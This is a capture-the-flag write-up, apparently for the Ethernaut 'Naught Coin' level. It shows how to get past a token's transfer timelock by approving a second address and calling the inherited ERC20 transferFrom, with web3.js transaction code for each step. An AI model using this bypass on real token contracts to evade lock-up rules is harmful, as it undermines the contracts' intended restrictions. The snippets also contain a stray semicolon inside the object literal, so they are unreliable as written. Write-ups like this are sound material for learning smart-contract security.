## 15. Naught Coin
This challenge doesn't need any contract to be exploited. The error of the creator of the contract is that, even if *transfer(address,value)* function has been modified with the timeLock modifier which avoid the **player** address to spend tokens, he didn't think about the *transferFrom(address,address,value)* function inherited with OpenZeppelin's ERC20 contract.


All we need to do is to use a secondary address which we will name *secondary_address* to transfer our tokens.

First, we need to give approval to the secondary address by calling the function *approve(secondary_address, 1000000000000000000000000)* with our player address :

```javascript
web3.eth.sendTransaction({
    to:contract_instance,
    from:player,
    data: web3.eth.abi.encodeFunctionCall({
	    name: 'approve',
	    type: 'function',
	    inputs: [{
	        type: 'address',
	        name: 'spender'
	    },{
	        type: 'uint256',
	        name: 'amount'
	    }]
	}, [secondary_address, 1000000000000000000000000]);
})
```

Then, we can transfer all our coins using *transferFrom(player, secondary_address, 1000000000000000000000000)* :

```javascript
web3.eth.sendTransaction({
    to:contract_instance,
    from:secondary_address,
    data: web3.eth.abi.encodeFunctionCall({
	    name: 'transferFrom',
	    type: 'function',
	    inputs: [{
	        type: 'address',
	        name: 'sender'
	    },{
	        type: 'address',
	        name: 'recipient'
	    },{
	        type: 'uint256',
	        name: 'amount'
	    }]
	}, [player, secondary_address, 1000000000000000000000000]);
})
```

And here we are, all tokens have been transfered.